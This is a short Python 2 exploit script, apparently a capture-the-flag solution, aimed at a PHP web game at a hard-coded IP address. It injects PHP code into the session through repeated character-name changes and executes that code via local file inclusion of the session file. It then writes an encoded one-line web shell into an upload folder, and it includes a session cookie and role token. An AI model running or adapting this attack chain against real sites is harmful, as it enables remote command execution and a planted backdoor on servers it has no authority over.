# -*- coding: utf-8 -*-
# by https://findneo.github.io/

import requests, hashlib, base64


def change_name(character_name):
    payload = dict(name=character_name, submit='Edit')
    r = requests.post(url + "?page=setting.php", cookies=cookie, data=payload)


def give_pet(user_email):
    payload = dict(pet="babydragon", email=user_email, submit="Give")
    r = requests.post(url + '?page=admin.php', cookies=cookie, data=payload)
    return r.content


def shell(cmd='uname'):
    payload = dict(
        page="/var/lib/php/sessions/sess_" + cookie['PHPSESSID'], f=cmd)
    r = requests.get(url, cookies=cookie, params=payload)
    return r.content


# edit your cookie['PHPSESSID'] & user_email to run this script
url = "http://178.128.87.16/"
user_email = "mapl@qq.com"
salt = 'ms_g00d_0ld_g4m3'

cookie = dict(
    PHPSESSID='8es749ivbfetvsmsc0ggthr2e5',
    _role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054',
)


def do(s):
    change_name(s)
    give_pet(user_email)
    print s
    print shell()


payload1 = """
<?=$_SESSION[a]='*/'?>
<?=$_SESSION[a].=';'?>
<?=$_SESSION[a].='"'?>
<?=$_SESSION[a].='<'?>
<?=$_SESSION[a].='?'/*
<?=$_SESSION[a].='='/*
<?=$_SESSION[a].=' '/*
"""

payload2 = '`echo PD89YCRfR0VUWzFdYDsK|base64 -d >> upload/%s/command.txt`' % hashlib.md5(
    salt + user_email).hexdigest()
payload3 = """
<?=$_SESSION[a].=''/*
<?=$_SESSION[a].='?'/*
<?=$_SESSION[a].='>'/*
<?=$_SESSION[a]?>
"""


def xxx():
    for p in payload1.split('\n')[1:-1]:
        do(p)
    for c in payload2:
        p = "<?=$_SESSION[a].='%s'/*" % c
        do(p)
    for p in payload3.split('\n')[1:-1]:
        do(p)


xxx()
print hashlib.md5(salt + user_email).hexdigest()
